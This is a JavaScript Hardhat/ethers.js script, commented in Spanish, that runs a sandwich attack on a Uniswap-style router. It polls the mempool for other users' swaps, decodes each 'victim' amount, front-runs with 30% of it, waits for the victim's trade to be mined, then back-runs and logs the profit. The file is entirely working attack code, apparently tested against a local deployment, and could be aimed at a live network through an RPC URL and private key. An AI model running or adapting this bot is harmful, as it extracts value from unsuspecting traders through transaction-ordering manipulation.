require("dotenv").config();
const { ethers } = require("hardhat");
const fs   = require("fs");
const path = require("path");

async function main() {
  // 1) Carga direcciones
  const { router, tokenA, tokenB } = JSON.parse(
    fs.readFileSync(path.resolve(__dirname, "../uniswap-addresses.json"), "utf8")
  );

  // 2) Configura provider y atacante
  const provider = new ethers.providers.JsonRpcProvider(process.env.RPC_URL);
  const attacker = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
  console.log("Attacker:", attacker.address);

  // 3) Instancia ERC-20 y Router con ABI minimo
  const ERC20 = [
    "function approve(address,uint256) external returns (bool)",
    "function balanceOf(address) view returns (uint256)"
  ];
  const tokenAContract = new ethers.Contract(tokenA, ERC20, attacker);
  const tokenBContract = new ethers.Contract(tokenB, ERC20, attacker);

  const routerAbi = [
    "function swapExactTokensForTokens(uint256,uint256,address[],address,uint256) external returns (uint256[])"
  ];
  const routerInterface = new ethers.utils.Interface(routerAbi);
  const routerContract  = new ethers.Contract(router, routerAbi, attacker);

  // 4) Prepara allowance infinito en Token A
  const MAX = ethers.constants.MaxUint256;
  await (await tokenAContract.approve(router, MAX)).wait();
  console.log("Router approved to spend TokenA");

  // 5) Monitorea mempool con polling RPC
  const seen = new Set();
  console.log("Starting mempool monitor...");
  setInterval(async () => {
    let pending = [];
    try {
      pending = await provider.send("eth_pendingTransactions", []);
    } catch(e) {
      console.error("RPC eth_pendingTransactions error:", e);
      return;
    }
    for (const tx of pending) {
      if (
        tx.to?.toLowerCase() === router.toLowerCase() &&
        tx.from.toLowerCase() !== attacker.address.toLowerCase() &&
        !seen.has(tx.hash)
      ) {
        seen.add(tx.hash);
        // Obtenemos la tx completa
        const fullTx = await provider.getTransaction(tx.hash);
        await attackSandwich(fullTx);
      }
    }
  }, 2500);

  // 6) Logica sandwich
  async function attackSandwich(victimTx) {
    console.log("Victim tx detected:", victimTx.hash);

    // 6.a) Sacamos el campo data
    const data = victimTx.data || victimTx.input;
    if (!data) {
      console.error("No data/input en tx:", victimTx.hash);
      return;
    }

    // 6.b) Parseamos con parseTransaction para extraer args[0] = amountIn
    let victimAmtIn;
    try {
      const txDesc = routerInterface.parseTransaction({ data });
      victimAmtIn = txDesc.args[0];
    } catch (err) {
      console.error("Fallo parseTransaction:", err);
      return;
    }

    if (!victimAmtIn || !victimAmtIn.mul) {
      console.error("amountIn invalido:", victimAmtIn);
      return;
    }

    // 6.c) Calculamos frontAmt como 30% de la victima
    const frontAmt = victimAmtIn.mul(30).div(100);
    const pathAB   = [ tokenA, tokenB ];
    const pathBA   = [ tokenB, tokenA ];
    const deadline = Math.floor(Date.now() / 1000) + 60 * 10;

    // Guarda balances iniciales
    const tokenABefore = await tokenAContract.balanceOf(attacker.address);
    const ethBefore    = await provider.getBalance(attacker.address);

    //FRONT-RUN
    console.log("Front-run con", ethers.utils.formatUnits(frontAmt,18), "TokenA");
    const frontTx = await routerContract.swapExactTokensForTokens(
      frontAmt, 0, pathAB, attacker.address, deadline,
      { gasLimit: 300_000 }
    );
    await frontTx.wait();
    console.log("Front-run tx:", frontTx.hash);

    //Espera a que mine la tx de la victima
    console.log("Waiting victim tx to be mined...");
    await provider.waitForTransaction(victimTx.hash);

    //BACK-RUN
    const tokenBbal = await tokenBContract.balanceOf(attacker.address);
    await (await tokenBContract.approve(router, MAX)).wait();
    console.log("Back-run con", ethers.utils.formatUnits(tokenBbal,18), "TokenB");
    const backTx = await routerContract.swapExactTokensForTokens(
      tokenBbal, 0, pathBA, attacker.address, deadline,
      { gasLimit: 300_000 }
    );
    await backTx.wait();
    console.log("Back-run tx:", backTx.hash);

    //Calcula beneficio
    const tokenAafter = await tokenAContract.balanceOf(attacker.address);
    const ethAfter    = await provider.getBalance(attacker.address);

    const profitA   = tokenAafter.sub(tokenABefore);
    const profitEth = ethAfter.sub(ethBefore);

    console.log("Profit TokenA:", ethers.utils.formatUnits(profitA,18));
    console.log("-----------------------------------------");
  }
}

main().catch(e => {
  console.error(e);
  process.exit(1);
});